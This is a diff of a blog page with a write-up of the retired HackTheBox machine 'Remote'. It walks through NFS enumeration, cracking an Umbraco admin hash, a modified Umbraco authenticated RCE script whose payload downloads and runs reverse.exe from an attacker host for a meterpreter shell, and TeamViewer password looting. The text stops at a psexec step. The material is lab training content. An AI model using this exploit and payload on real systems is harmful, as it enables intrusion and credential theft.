@@ -1,169 +1,123 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Remote published by mrb3n on Mars the 21th 2020. This box is a Windows machine classified as easy. It implies a NFS share, a vulnerable CMS, TeamViewer and a second unintended way towards root." />
-<meta name="keywords" content="security, boot2root, HTB, windows, umbraco, teamviewer, metasploit, msfvenom">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Remote"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Remote published by mrb3n on Mars the 21th 2020. This box is a Windows machine classified as easy. It implies a NFS share, a vulnerable CMS, TeamViewer and a second unintended way towards root."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2020/11/htb-remote.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2020-11-10 20:50:00+01:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="windows"/>
-  <meta property="article:tag" content="umbraco"/>
-  <meta property="article:tag" content="teamviewer"/>
-  <meta property="article:tag" content="metasploit"/>
-  <meta property="article:tag" content="msfvenom"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Remote</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Remote published by mrb3n on Mars the 21th 2020. This box is a Windows machine classified as easy. It implies a NFS share, a vulnerable CMS, TeamViewer and a second unintended way towards root." name="description"/>
+<meta content="security, boot2root, HTB, windows, umbraco, teamviewer, metasploit, msfvenom" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Remote" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Remote published by mrb3n on Mars the 21th 2020. This box is a Windows machine classified as easy. It implies a NFS share, a vulnerable CMS, TeamViewer and a second unintended way towards root." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2020/11/htb-remote.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-11-10 20:50:00+01:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="windows" property="article:tag"/>
+<meta content="umbraco" property="article:tag"/>
+<meta content="teamviewer" property="article:tag"/>
+<meta content="metasploit" property="article:tag"/>
+<meta content="msfvenom" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Remote</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-remote">HTB: Remote</h1>
-    <p>
+<header>
+<h1 id="htb-remote">HTB: Remote</h1>
+<p>
       Posted on 10 Nov 2020 in <a href="../../category/security.html">security</a>
 
-        &#8226; 6 min read
+        • 6 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2020.11/remote_card.png" alt="Remote card" width="262"></p>
+</header>
+<div>
+<p><img alt="Remote card" class="align-left" src="/media/2020.11/remote_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/234">Remote</a> published by
 <a href="https://www.hackthebox.com/home/users/profile/2984">mrb3n</a> on Mars the 21th 2020.
 This box is a Windows machine classified as easy. It implies a NFS share, a
 vulnerable CMS, TeamViewer and a second unintended way towards root.</p>
-
-
 <h1>Initial foothold</h1>
 <p>We start with an nmap scan. 10 ports are open.</p>
 <div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Thu Mar 26 10:51:40 2020 as: nmap -sS -oN nmap2 --top-ports=10000 -sV 10.10.10.180
@@ -186,7 +140,6 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Mar 26 11:02:07 2020 -- 1 IP address (1 host up) scanned in 626.37 seconds
 </code></pre></div>
-
 <p>For each port we will look what service is running an how we can enumerate them:</p>
 <ul>
 <li>Port 21: FTP, <strong>we will dig it more</strong></li>
@@ -203,7 +156,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>We try to connect to the FTP using an anonymous connection. At this time (Mars
 27th 2020) Firefox still support this protocol. But there is no file available
 with the anonymous account.</p>
-<p><img alt="anonymous FTP" src="/media/2020.11/remote_02.png"></p>
+<p><img alt="anonymous FTP" class="image-process-article-image" src="/media/2020.11/derivatives/article-image/remote_02.png"/></p>
 <h2>SMB</h2>
 <p>We try to enumerate the SMB share and users using the metasploit modules
 <code>auxiliary/scanner/smb/smb_enumshares</code> and
@@ -211,7 +164,7 @@ with the anonymous account.</p>
 <h2>Web</h2>
 <p>The home page is about selling products. We quickly browse the website but
 nothing really pop out.</p>
-<p><img alt="Website homepage" src="/media/2020.11/remote_04.png"></p>
+<p><img alt="Website homepage" class="image-process-article-image" src="/media/2020.11/derivatives/article-image/remote_04.png"/></p>
 <p>We run <a href="https://github.com/ffuf/ffuf">fuff</a> a <code>Go</code> equivalent of <code>dirb</code> with the
 <code>big.txt</code> wordlist from dirb. This allow us to found the "umbraco" login page.</p>
 <div class="highlight"><pre><span></span><code>$ ./ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.180/FUZZ -mc 200 -c -v
@@ -219,8 +172,7 @@ nothing really pop out.</p>
 [Status: 200, Size: 4040, Words: 710, Lines: 96]
 | URL | http://10.10.10.180/umbraco
 </code></pre></div>
-
-<p><img alt="Umbraco login page" src="/media/2020.11/remote_01.png"></p>
+<p><img alt="Umbraco login page" class="image-process-article-image" src="/media/2020.11/derivatives/article-image/remote_01.png"/></p>
 <p>There is a few exploits for this CMS but we do not have any credentials to login.</p>
 <h2>NFS</h2>
 <p>We enumerate the NFS share using the <code>auxiliary/scanner/nfs/nfsmount</code> metasploit
@@ -234,7 +186,6 @@ msf5 auxiliary(scanner/nfs/nfsmount) &gt; run
 [*] 10.10.10.180:111      - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 </code></pre></div>
-
 <p>We mount the share in a temporary folder using <code>mount</code>. A few Google search lead
 us to the <a href="https://our.umbraco.com/forum/umbraco-8/96468-umbraco-8-database-file">umbraco configuration file</a>.</p>
 <div class="highlight"><pre><span></span><code>$ mkdir /tmp/nfs
@@ -245,30 +196,27 @@ App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.as
 $ ls App_Data
 cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
 </code></pre></div>
-
 <p>We copy it on our local folder and run <code>string</code> on it. The password hash for the
 account "admin@htb.local’ is in the first lines.</p>
 <div class="highlight"><pre><span></span><code>strings ~/pentest/htb_remote/Umbraco.sdf  | less
-Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
-adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
-adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
-smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
-ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
-ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
+ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
+ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
 </code></pre></div>
-
 <p>We run John the ripper with the Rockyou word list against the hash and found the
 password "baconandcheese".</p>
 <div class="highlight"><pre><span></span><code>$ john hash -w=tools/password_lists/rockyou.txt
 Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
 Warning: no OpenMP support for this hash type, consider --fork=4
-Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Press 'q' or Ctrl-C to abort, almost any other key for status
 baconandcheese   (?)
 </code></pre></div>
-
 <p>The credentials admin@htb.local:baconandcheese allow us ton connect to the
 Umbraco interface.</p>
-<p><img alt="Umbraco admin interface" src="/media/2020.11/remote_05.png"></p>
+<p><img alt="Umbraco admin interface" class="image-process-article-image" src="/media/2020.11/derivatives/article-image/remote_05.png"/></p>
 <h2>Exploiting Umbraco</h2>
 <p>As previously mentioned there is a few exploit for Umbraco.</p>
 <div class="highlight"><pre><span></span><code>$ searchsploit umbraco
@@ -283,7 +231,6 @@ Umbraco CMS SeoChecker Plugin 1.9.2 -  | exploits/php/webapps/44988.txt
 Shellcodes: No Result
 Papers: No Result
 </code></pre></div>
-
 <p>We want to use "Umbraco CMS 7.12.4 - (Authenticated) Remote code execution". We
 get the script from our local exploitdb. Looking at the POC, it is launching a
 <code>calc.exe</code> on the server. We try it to see if we get an error.</p>
@@ -300,65 +247,62 @@ get the script from our local exploitdb. Looking at the POC, it is launching a
 <span class="k">def</span> <span class="nf">print_dict</span><span class="p">(</span><span class="n">dico</span><span class="p">):</span>
     <span class="nb">print</span><span class="p">(</span><span class="n">dico</span><span class="o">.</span><span class="n">items</span><span class="p">());</span>
 
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Start&quot;</span><span class="p">);</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Start"</span><span class="p">);</span>
 
 <span class="c1"># Execute a calc for the PoC</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; </span><span class="se">\</span>
-<span class="s1">xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; </span><span class="se">\</span>
-<span class="s1">xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;</span><span class="se">\</span>
-<span class="s1">&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() </span><span class="se">\</span>
-<span class="s1">{ string cmd = &quot;mkdir /tmp;iwr -uri http://10.10.14.80:8081/reverse.exe -outfile /tmp/reverse.exe;/tmp/reverse.exe&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process();</span><span class="se">\</span>
-<span class="s1">proc.StartInfo.FileName = &quot;powershell.exe&quot;; proc.StartInfo.Arguments = cmd;</span><span class="se">\</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">'&lt;?xml version="1.0"?&gt;&lt;xsl:stylesheet version="1.0" </span><span class="se">\</span>
+<span class="s1">xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" </span><span class="se">\</span>
+<span class="s1">xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"&gt;</span><span class="se">\</span>
+<span class="s1">&lt;msxsl:script language="C#" implements-prefix="csharp_user"&gt;public string xml() </span><span class="se">\</span>
+<span class="s1">{ string cmd = "mkdir /tmp;iwr -uri http://10.10.14.80:8081/reverse.exe -outfile /tmp/reverse.exe;/tmp/reverse.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();</span><span class="se">\</span>
+<span class="s1">proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;</span><span class="se">\</span>
 <span class="s1">proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; </span><span class="se">\</span>
 <span class="s1">proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </span><span class="se">\</span>
-<span class="s1">&lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt;</span><span class="se">\</span>
-<span class="s1">&lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; &#39;</span><span class="p">;</span>
+<span class="s1">&lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="csharp_user:xml()"/&gt;</span><span class="se">\</span>
+<span class="s1">&lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; '</span><span class="p">;</span>
 
-<span class="n">login</span> <span class="o">=</span> <span class="s2">&quot;admin@htb.local&quot;</span><span class="p">;</span>
-<span class="n">password</span><span class="o">=</span><span class="s2">&quot;baconandcheese&quot;</span><span class="p">;</span>
-<span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;http://10.10.10.180&quot;</span><span class="p">;</span>
+<span class="n">login</span> <span class="o">=</span> <span class="s2">"admin@htb.local"</span><span class="p">;</span>
+<span class="n">password</span><span class="o">=</span><span class="s2">"baconandcheese"</span><span class="p">;</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s2">"http://10.10.10.180"</span><span class="p">;</span>
 
 
 <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
-<span class="n">url_main</span> <span class="o">=</span><span class="n">host</span><span class="o">+</span><span class="s2">&quot;/umbraco/&quot;</span><span class="p">;</span>
+<span class="n">url_main</span> <span class="o">=</span><span class="n">host</span><span class="o">+</span><span class="s2">"/umbraco/"</span><span class="p">;</span>
 <span class="n">r1</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_main</span><span class="p">);</span>
 <span class="n">print_dict</span><span class="p">(</span><span class="n">r1</span><span class="o">.</span><span class="n">cookies</span><span class="p">);</span>
 
 
-<span class="n">url_login</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s2">&quot;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&quot;</span><span class="p">;</span>
-<span class="n">loginfo</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="n">login</span><span class="p">,</span><span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="n">password</span><span class="p">};</span>
+<span class="n">url_login</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s2">"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"</span><span class="p">;</span>
+<span class="n">loginfo</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"username"</span><span class="p">:</span><span class="n">login</span><span class="p">,</span><span class="s2">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">};</span>
 <span class="n">r2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">loginfo</span><span class="p">);</span>
 
 
-<span class="n">url_xslt</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s2">&quot;/umbraco/developer/Xslt/xsltVisualize.aspx&quot;</span><span class="p">;</span>
+<span class="n">url_xslt</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s2">"/umbraco/developer/Xslt/xsltVisualize.aspx"</span><span class="p">;</span>
 <span class="n">r3</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">);</span>
 
-<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r3</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">);</span>
-<span class="n">VIEWSTATE</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s2">&quot;__VIEWSTATE&quot;</span><span class="p">)[</span><span class="s1">&#39;value&#39;</span><span class="p">];</span>
-<span class="n">VIEWSTATEGENERATOR</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s2">&quot;__VIEWSTATEGENERATOR&quot;</span><span class="p">)[</span><span class="s1">&#39;value&#39;</span><span class="p">];</span>
-<span class="n">UMBXSRFTOKEN</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;UMB-XSRF-TOKEN&#39;</span><span class="p">];</span>
-<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;UMB-XSRF-TOKEN&#39;</span><span class="p">:</span><span class="n">UMBXSRFTOKEN</span><span class="p">};</span>
-<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;__EVENTTARGET&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;__EVENTARGUMENT&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;__VIEWSTATE&quot;</span><span class="p">:</span><span class="n">VIEWSTATE</span><span class="p">,</span><span class="s2">&quot;__VIEWSTATEGENERATOR&quot;</span><span class="p">:</span><span class="n">VIEWSTATEGENERATOR</span><span class="p">,</span><span class="s2">&quot;ctl00$body$xsltSelection&quot;</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span><span class="s2">&quot;ctl00$body$contentPicker$ContentIdValue&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;ctl00$body$visualizeDo&quot;</span><span class="p">:</span><span class="s2">&quot;Visualize+XSLT&quot;</span><span class="p">};</span>
+<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r3</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">'html.parser'</span><span class="p">);</span>
+<span class="n">VIEWSTATE</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s2">"__VIEWSTATE"</span><span class="p">)[</span><span class="s1">'value'</span><span class="p">];</span>
+<span class="n">VIEWSTATEGENERATOR</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s2">"__VIEWSTATEGENERATOR"</span><span class="p">)[</span><span class="s1">'value'</span><span class="p">];</span>
+<span class="n">UMBXSRFTOKEN</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">'UMB-XSRF-TOKEN'</span><span class="p">];</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'UMB-XSRF-TOKEN'</span><span class="p">:</span><span class="n">UMBXSRFTOKEN</span><span class="p">};</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"__EVENTTARGET"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="s2">"__EVENTARGUMENT"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="s2">"__VIEWSTATE"</span><span class="p">:</span><span class="n">VIEWSTATE</span><span class="p">,</span><span class="s2">"__VIEWSTATEGENERATOR"</span><span class="p">:</span><span class="n">VIEWSTATEGENERATOR</span><span class="p">,</span><span class="s2">"ctl00$body$xsltSelection"</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span><span class="s2">"ctl00$body$contentPicker$ContentIdValue"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="s2">"ctl00$body$visualizeDo"</span><span class="p">:</span><span class="s2">"Visualize+XSLT"</span><span class="p">};</span>
 
 
 <span class="n">r4</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">);</span>
 
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;End&quot;</span><span class="p">);</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">"End"</span><span class="p">);</span>
 </code></pre></div>
-
 <p>That allow us to get a meterpreter on the box.</p>
 <div class="highlight"><pre><span></span><code>meterpreter &gt; getuid
 Server username: IIS APPPOOL\DefaultAppPool
 </code></pre></div>
-
 <p>We can then use the meterpeter search function to found the user flag.</p>
 <div class="highlight"><pre><span></span><code>meterpreter &gt; search -f user.txt
 Found 1 result...
     c:\Users\Public\user.txt (34 bytes)
-meterpreter &gt; cat &quot;c:\Users\Public\user.txt&quot;
+meterpreter &gt; cat "c:\Users\Public\user.txt"
 fd2b1f187e6f48be38c224cdcb61faf5
 </code></pre></div>
-
 <h1>Getting Root</h1>
 <h2>TeamViewer way</h2>
 <p>We run simple <code>ps</code> on the system to list the process.
@@ -371,14 +315,12 @@ We easily spot the TeamViewer process.</p>
 2936  628   svchost.exe
 2944  628   TeamViewer_Service.exe
 </code></pre></div>
-
 <p>A few Google search lead us to a metasploit post module to retrieve TeamViewer passwords</p>
 <div class="highlight"><pre><span></span><code>meterpreter &gt; run post/windows/gather/credentials/teamviewer_passwords
 
 [*] Finding TeamViewer Passwords on REMOTE
 [+] Found Unattended Password: !R3m0te!
 </code></pre></div>
-
 <p>I struggle a lot there trying to connect to the TeamViewer session.
 First I looted the TeamViewer ID in
 <code>C:\Program Files (x86)\TeamViewer\Version7\TeamViewer7_Logfile.log</code> first lines.</p>
@@ -386,7 +328,7 @@ First I looted the TeamViewer ID in
 the TeamViewer ID.  Therefore I tried to connect localy
 <a href="https://community.teamviewer.com/t5/Knowledge-Base/Can-TeamViewer-be-used-within-a-local-network-LAN-only/ta-p/4618">using directly the IP address</a>
 but this also doesn't work.</p>
-<p><img alt="TeamViewer" src="/media/2020.11/remote_03.png"></p>
+<p><img alt="TeamViewer" class="image-process-article-image" src="/media/2020.11/derivatives/article-image/remote_03.png"/></p>
 <p>The solution was simpler as this is a simple password reuse. We fire a psexec
